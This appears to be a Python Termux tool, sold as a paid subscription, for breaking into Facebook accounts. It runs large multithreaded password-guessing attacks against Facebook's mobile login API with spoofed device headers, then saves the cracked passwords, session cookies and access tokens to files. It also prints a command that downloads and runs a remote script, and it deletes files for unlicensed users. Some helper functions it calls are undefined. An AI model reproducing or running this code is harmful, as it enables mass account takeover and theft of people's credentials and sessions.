#coding = utf-8
#OPEN SOURCE FOR NOOBS
#REASON Faraz Ali ID POST AGAINST 
#TO MR-ADI 👈 
import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp
#_________[ INSTALLING REQUESTS ]_____
'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)

if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"

elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:
	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")
'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

def p(x):
	print(x)

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = (f'''\033[1;97m
\33[1;34m╔═══╦╗─╔╦═══╦╗─╔╦══╗╔═══╦════╗╔═══╦╗──╔══╗
\33[1;97m║╔═╗║║─║║╔═╗║║─║║╔╗║║╔═╗╠══╗═║║╔═╗║║──╚╣╠╝\33[1;34m   P 
\33[1;32m║╚══╣╚═╝║║─║║╚═╝║╚╝╚╣║─║║─╔╝╔╝║║─║║║───║║   
\33[1;36m╚══╗║╔═╗║╚═╝║╔═╗║╔═╗║╚═╝║╔╝╔╝─║╚═╝║║─╔╗║║   \33[1;32m R         
\33[1;97m║╚═╝║║─║║╔═╗║║─║║╚═╝║╔═╗╠╝═╚═╗║╔═╗║╚═╝╠╣╠╗ 
\33[1;34m╚═══╩╝─╚╩╝─╚╩╝─╚╩═══╩╝─╚╩════╝╚╝─╚╩═══╩══╝ \33[1;36m  O
\33[1;36m---------------------------------------------------
 \33[1;34m Owner     >>    Yourname
 \33[1;97m Github    >>    your github
 \33[1;32m Tool      >>    tool type
  \33[1;36mversion   >>    0.0.1
\33[1;32m--------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string

def update():
	logo()
	print(' [•] Checking Updates from Our Server ....')
	line()
	try:
		server = pars(requests.get('https://dilutecodes.blogspot.com/2023/05/iamabestserver.html?m=1',verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet")
	for x in server.find_all('div',class_='post-body entry-content float-container'):
		r = x.text

	if '2.0.1' in r:
		print(' [•] Server is Online Welcome Users ..')
		sp(1)
		print(" [•] Tool is Updated On 24/5/2023")
		print(" [•] Checking Subscription ")
		iAmApprovelSystem()
	elif "off" in r:
		print(' [•] Server is Offline For Some Reasons ..')
		exit()
	else:
		print(' [•] A new Version of this Dilute Tool is Available | Please Wait ....')
		print(" [•] Updating Tool ....")
		line()
		sp(1)
		


def iAmApprovelSystem():
	try:
		r = pars(requests.get("https://aqibservers.blogspot.com/2023/05/iamjohnnysins.html?m=1",verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet Connection ...")
	except Exception as e:
		print(e)
	for x in r.find_all('div',class_="post-body entry-content float-container"):
		server_keys = x.text
	if 'free' in str(server_keys):
		print(" [•] Tool is on Free Trial Enjoy")
		sp(2)
		iAmMain().iAmMenu()
	elif 'update' in str(server_keys):
		print(" [•] Tool is Under Maintenence ")
		exit()
	elif str(bumper) in server_keys:
		if str(bumper)+'|ok' in server_keys:
			status = 'ok'
			iAmMain().iAmMenu()
	elif str(bumper) in server_keys:
		if str(bumper)+'|expired' in server_keys:
			buy()
	elif str(bumper) in server_keys:
		if str(bumper)+'|fuck' in server_keys:
			status = 'fuck'
			print(" [•] You Dont Have Permission To use this Tool ..")
			os.system("rm -rf d64 d32 SKB")
			exit()
	elif str(key) in server_keys:
		if str(key)+'|ok' in server_keys:
			iAmMain().iAmMenu()
	else:
		buy()

def buy():
	logo()
	line()
	print(" [•] Terms and Conditions Please Read Carefully ")
	print(" [•] Your Token is Not Approved ")
	print(" [•] This Tool is paid you need to buy first before Use ! ")
	print(" [•] 1 token is only for 1 device you can't use your subscription in more than 1 device")
	print(" [•] please do agree terms and conditions then buy")
	line()
	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
	print(' [•] Apni zimaydari pe buy kren,me koi b zimaydari n leta illegal atctivity k')
	print(" [•] 300 / 1Month , 250 / 15 Days ")
	print(" [•] Payment : JazzCash/Easypaisa")
	print(' [•] Account Num : 03152056613 ')
	print(" [•] Token : %s"%(bumper))
	print(" [•] Copy & send Token to Admun to get approved ")
	print(" [•] Koi mera dost ho ya kuch b ho ab free approvel me kise ko nhi donga ids ay ya nah ay apni zimaydari pe buy kro ")
	line()
	exit()


def iAmMethod3Ua():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice("Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36")
	return ua


nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		p(" [1] File Cloning ")
		p(" [2] Random Clone")
		p(" [3] Dump Tool")
		p(" [4] Pass changer ")
		p(" [E] Exit Tool ")
		line()
		opt1 = input(" {√} Select An Option : ")
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":self.num_menu()
		elif opt1 == "4":automation().menu()
		elif opt1 == "3":Grep().links_only()
		elif opt1 == "E":exit(" [•] KATM.TATA BY BY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
	
	
	def dump_menu(self):
		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
		
	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/filename.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		p(" [3] Method 3 [BEST] ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		elif m_opt =="4":
			 method.append('iiii')
			 self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords like : first last First Last etc ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def num_menu(self):
		logo()
		pwx=[]
		p(" [•] Advanced Random Cloning Tool ")
		line()
		p(" [•] Example : 0300 , 0313 , 0324 , 0342 ")
		line()
		code = input(" [•] Put Sim Code : ")
		logo()
		p(" [•] Example : 1000, 2000 , 5000 Max ")
		max = 5000
		try:
			clone_limit = int(input(" [•] Put Clone Limit : "))
			if clone_limit =="":
				clone_limit = 1000
			elif clone_limit > max:
				p(" [•] Limit Should be Under 5000 ");sp(2);self.num_menu()
		except:
			clone_limit = 1000
		for n in range(clone_limit):
			_ = random.randint(1111111,9999999)
			id.append(str(_))
		logo()
		p(" [1] Auto Password \n [2] Choice Password ")
		line()
		pwx_=[]
		pw_select = input(" [•] Choose : ")
		if pw_select == "1":
			pwx_.append("i")
		elif pw_select == "2":
			pwx_.append('ii')
			max = 10
			try:
				p_limit = int(input(" [•] Put Password Limit : "))
				if p_limit =="":
					p_limit = 5
				elif p_limit > max:
					p(" [•] Limit Should be Under 1 - 10 ");sp(2);num_menu()
			except:
				p_limit = 5
			for n in range(p_limit):
				pwx.append(input(" [•] Put Password %s : "%(n+1)))
		else:
			pwx_.append("i")
		logo()
		
		p(" [•] Total Random Accounts : %s "%(str(len(id))))
		p(" [•] Dilute Brute Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = code+user
				if "i" in pwx_:
					pwx = [user,uid,"khan1122","khankhan","khan123","baloch","i love you","khan1234","khan12345"]
					saqi.submit(self.r_crack,uid,pwx)
				elif "ii" in pwx_:
					saqi.submit(self.r_crack,uid,pwx)
				else:
					saqi.submit(self.r_crack,uid,pwx)
		self.saved_results(ok,cp)
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SKB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': R_Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/SKB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SKB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KANO-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KANO_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ALONE] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod2Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(30000, 40000)),
'X-FB-SIM-HNI': str(random.randint(30000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid={nid};pid=Main;tid={tid};nc=1;fc=0;bc=0;cid={connection_token()}',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[KANO-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/KANO_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KANO_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KANO-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KANO_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ALONE %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[KANO-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/KANO_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KANO_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KANO-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KANO_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KLIEN] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				params = {
					"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": uid,
					"locale": "en_PK",
					"password": pw,
					"sdk": "Android",
					"generate_session_cookies": "1",
					"sig": "374e60f8b9bb6b8cbb30f78030438895"
				}
				headers = {

					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": iAmMethod4Ua(),
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger",
					"Authorization":"Auth2 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#print(q)
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[KANO-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/KANO_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KANO_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KANO-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KANO_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KANO] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"device":"Samsung",
"sdk":"Android",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': R_Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[KANO-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/KANO_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KANO_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KANO-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KANO_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.r_crack(uid,pwx)
		except Exception as e:
			print(e)
class Join:
	def __init_(self):
		logo()
		#s.system("xdg-open https://wa.me/+923152056613")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/HF3burNYuZx0den94ooYbk')
		iAmMain().iAmMenu()
	def Facebook(self):
		os.system('xdg-open https://facebook.com/groups/124939013896146/')
		iAmMain().iAmMenu()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("	[✓]	Example  /sdcard/file1.txt  ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("	Example  :-  /sdcard/file1.txt  ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	  Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [	Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):

		try:
			p("	Example  :-  /sdcard/file.txt	")
			line()
			file = input(" [✓] File Path :- ")
			line()
			p("	Example  :-  /sdcard/file1.txt	")
			ofile= input(" [✓] File Save Path :- ")
			line()
			try:
				p("	 Example :-  1 ,2,3,4,5 etc	")
				limit = int(input(" [=] How many Links with names you wanna grab :- "))
			except:
				limit = 2
			p("	Example  :-	100089 , 100088 etx  ")
			for n in range(limit):
				line()
				digit = int(input(" [•|•] Put Digits %s :- "%(n+1)))
				os.system('cat '+file+' | grep '+str(digit)+' >>'+ofile+' ')
				p(" [	Your File Saved in :- %s ]  "%(ofile))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.with_names()
		except:
			p("	[X] File Not Found ;(  ");sp(1);self.with_names()


class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
